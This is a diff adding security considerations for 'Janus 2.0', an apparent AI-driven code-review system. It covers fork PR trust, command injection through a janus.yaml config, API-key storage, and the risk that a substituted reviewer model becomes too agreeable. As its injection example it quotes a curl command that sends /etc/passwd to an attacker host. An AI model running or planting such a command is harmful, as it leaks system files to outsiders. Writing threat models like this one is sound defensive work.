@@ -58,3 +58,29 @@ Recognizing the massive value of the secure, deterministic execution gate, we ex
 2. **Zombie Debate Sessions**
    * **The Flaw**: If a worker process is killed abruptly (e.g., OOM kill, SIGKILL, hardware failure) while processing a debate, the debate's status will remain `running` in the database forever. 
    * **Recommendation**: Implement a heartbeat mechanism or a "zombie sweeper" cron job that resets any debate stuck in `running` for more than 30 minutes back to `queued`.
+
+---
+
+## 🔄 Janus 2.0 Security Considerations
+
+The following security considerations apply to the Janus 2.0 architecture changes:
+
+### 1. Fork PR Security (NEW)
+* **Context**: Janus 2.0 adds GitHub App integration with automatic and manual review triggers.
+* **Risk**: PRs from forks are attacker-controlled. A malicious fork PR could contain crafted code designed to exploit the review process, extract secrets via the validation sandbox, or abuse LLM API quotas.
+* **Mitigation**: Fork PRs are untrusted by default (Hard Rule 10). They MUST NOT trigger automatic reviews, run sandbox execution with merge authority, or access repository secrets. Read-only review mode is available only after explicit maintainer approval.
+
+### 2. janus.yaml Command Injection (NEW)
+* **Context**: janus.yaml allows repositories to define arbitrary shell commands for validation checks.
+* **Risk**: A malicious janus.yaml could define commands like `command: curl http://evil.com/exfil?data=$(cat /etc/passwd)` as a 'lint' check.
+* **Mitigation**: All validation commands run inside the same container-isolated sandbox as the existing gate (--network none, --read-only, resource-capped). The network isolation prevents data exfiltration. The fail-closed container policy applies: if Docker is unavailable, no commands execute.
+
+### 3. BYOK Key Storage (NEW)
+* **Context**: Enterprise users can bring their own LLM API keys.
+* **Risk**: User-provided API keys must be stored securely. Plaintext storage or logging would violate Hard Rule 5.
+* **Mitigation**: BYOK keys follow the same security model as Janus's own API keys — hashed at rest, never logged in plaintext, never included in error messages or debug output. Keys are stored encrypted per-installation, never in repository configuration files.
+
+### 4. Multi-Provider Model Substitution
+* **Context**: Different LLM providers have different safety profiles and capabilities.
+* **Risk**: A model swap could change the Reviewer's behavior in ways that weaken the adversarial dynamic (e.g., a model that's too agreeable to approve everything).
+* **Mitigation**: The deterministic gate remains the sole merge authority regardless of which model is used (Hard Rule 1). The model choice is invisible to the gate — it validates code correctness, not LLM output quality.
